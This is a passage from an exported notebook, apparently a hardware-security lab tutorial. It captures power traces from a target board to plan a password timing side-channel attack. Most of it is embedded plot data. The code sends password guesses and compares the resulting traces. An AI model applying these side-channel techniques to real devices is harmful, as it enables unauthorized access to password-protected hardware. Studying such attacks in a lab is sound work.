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","dtype":"float64","shape":[2000]}},"selected":{"id":"1047","type":"Selection"},"selection_policy":{"id":"1046","type":"UnionRenderers"}},"id":"1034","type":"ColumnDataSource"},{"attributes":{"overlay":{"id":"1045","type":"BoxAnnotation"}},"id":"1023","type":"BoxZoomTool"},{"attributes":{},"id":"1024","type":"SaveTool"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1035","type":"Line"},{"attributes":{},"id":"1025","type":"ResetTool"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1036","type":"Line"},{"attributes":{},"id":"1026","type":"HelpTool"},{"attributes":{},"id":"1042","type":"BasicTickFormatter"},{"attributes":{"data_source":{"id":"1034","type":"ColumnDataSource"},"glyph":{"id":"1035","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1036","type":"Line"},"selection_glyph":null,"view":{"id":"1038","type":"CDSView"}},"id":"1037","type":"GlyphRenderer"},{"attributes":{},"id":"1044","type":"BasicTickFormatter"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1045","type":"BoxAnnotation"},{"attributes":{},"id":"1046","type":"UnionRenderers"},{"attributes":{},"id":"1047","type":"Selection"},{"attributes":{"callback":null},"id":"1003","type":"DataRange1d"},{"attributes":{"text":""},"id":"1039","type":"Title"},{"attributes":{"callback":null},"id":"1005","type":"DataRange1d"},{"attributes":{},"id":"1007","type":"LinearScale"}],"root_ids":["1002"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"e1c9bd12-67fe-479b-a450-b05f9a35e4c9","roots":{"1002":"0f06e2d3-ee94-47b0-857a-08e0e1152128"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

Timing Analysis
---------------

Now that we can capture traces, we can begin planning our attack. First
we'll make a function to guess a password and return a power trace,
since we'll be repeating those steps a lot:


**In [13]:**

.. code:: ipython3

    def cap_pass_trace(pass_guess):
        ret = ""
        reset_target(scope)
        num_char = target.in_waiting()
        while num_char > 0:
            ret += target.read(num_char, 10)
            time.sleep(0.01)
            num_char = target.in_waiting()
    
        scope.arm()
        target.write(pass_guess)
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
    
        trace = scope.get_last_trace()
        return trace

Next, we'll try two different passwords and see if the power traces
differ by length. We'll then plot both traces on the same figure (with
the first in red and the second in blue).


**In [14]:**

.. code:: ipython3

    trace = cap_pass_trace("\n")
    new_trace = cap_pass_trace("h\n")
    x_range = range(0, len(new_trace))
    p = figure()
    p.add_tools(CrosshairTool())
    p.line(x_range, new_trace)
    p.line(x_range, trace, line_color='red')
    show(p)


**Out [14]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    



.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="f1e0ff64-a4b8-47cc-b506-351f36c7a4e1" data-root-id="1102"></div>
    
    </div>



.. raw:: html

    

    <div id="66c1a270-e6e6-4530-992e-4e1599b109d4"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#66c1a270-e6e6-4530-992e-4e1599b109d4');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"4e782c07-fda0-44c8-9543-df46d323d8d6":{"roots":{"references":[{"attributes":{"below":[{"id":"1111","type":"LinearAxis"}],"center":[{"id":"1115","type":"Grid"},{"id":"1120","type":"Grid"}],"left":[{"id":"1116","type":"LinearAxis"}],"renderers":[{"id":"1139","type":"GlyphRenderer"},{"id":"1144","type":"GlyphRenderer"}],"title":{"id":"1155","type":"Title"},"toolbar":{"id":"1127","type":"Toolbar"},"x_range":{"id":"1103","type":"DataRange1d"},"x_scale":{"id":"1107","type":"LinearScale"},"y_range":{"id":"1105","type":"DataRange1d"},"y_scale":{"id":"1109","type":"LinearScale"}},"id":"1102","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1162","type":"UnionRenderers"},{"attributes":{},"id":"1112","type":"BasicTicker"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1161","type":"BoxAnnotation"},{"attributes":{},"id":"1117","type":"BasicTicker"},{"attributes":{},"id":"1160","type":"BasicTickFormatter"},{"attributes":{},"id":"1107","type":"LinearScale"},{"attributes":{},"id":"1134","type":"CrosshairTool"},{"attributes":{"formatter":{"id":"1158","type":"BasicTickFormatter"},"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1111","type":"LinearAxis"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,1638,